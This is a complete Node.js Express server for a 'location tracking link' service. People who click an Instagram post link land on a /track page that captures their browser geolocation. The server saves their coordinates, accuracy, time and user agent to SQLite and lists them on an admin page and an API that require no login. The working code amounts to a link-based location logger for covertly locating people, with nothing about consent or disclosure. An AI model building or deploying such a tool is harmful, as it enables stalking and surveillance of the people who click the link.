/**
 * Server backend for location tracking link application
 * Using Node.js with Express and SQLite3
 * - /track          : Serve tracking page that gets geolocation & sends to /api/location
 * - /api/location   : Receive posted location data, save to database
 * - /admin          : Admin page to view saved locations
 */

const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Setup SQLite database
const db = new sqlite3.Database('./locations.db', (err) => {
  if (err) {
    console.error('Could not connect to database', err);
  } else {
    console.log('Connected to SQLite database');
  }
});

// Create table if not exists
db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS visitors (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      latitude REAL,
      longitude REAL,
      accuracy REAL,
      timestamp TEXT,
      userAgent TEXT
    )
  `);
});

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public'))); // Serve static files from /public

// Routes

// Serve tracking page - user clicks Instagram post link to get here
app.get('/track', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API endpoint to receive location data
app.post('/api/location', (req, res) => {
  const { latitude, longitude, accuracy } = req.body;
  const timestamp = new Date().toISOString();
  const userAgent = req.headers['user-agent'] || 'unknown';

  if (
    typeof latitude !== 'number' ||
    typeof longitude !== 'number' ||
    typeof accuracy !== 'number'
  ) {
    return res.status(400).json({ message: 'Invalid location data' });
  }

  const stmt = db.prepare(
    `INSERT INTO visitors (latitude, longitude, accuracy, timestamp, userAgent) VALUES (?, ?, ?, ?, ?)`
  );
  stmt.run(latitude, longitude, accuracy, timestamp, userAgent, function (err) {
    if (err) {
      console.error('DB insert error:', err);
      return res.status(500).json({ message: 'Failed to save location' });
    }
    res.json({ message: 'Location saved', id: this.lastID });
  });
  stmt.finalize();
});

// Admin page to list all recorded locations
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// API to get all visitor locations (for admin page)
app.get('/api/visitors', (req, res) => {
  db.all(`SELECT * FROM visitors ORDER BY timestamp DESC LIMIT 100`, [], (err, rows) => {
    if (err) {
      console.error('DB select error:', err);
      return res.status(500).json({ message: 'Failed to retrieve data' });
    }
    res.json(rows);
  });
});

// Start server
app.listen(PORT, () => {
  console.log('Server running on http://localhost:' + PORT);
});
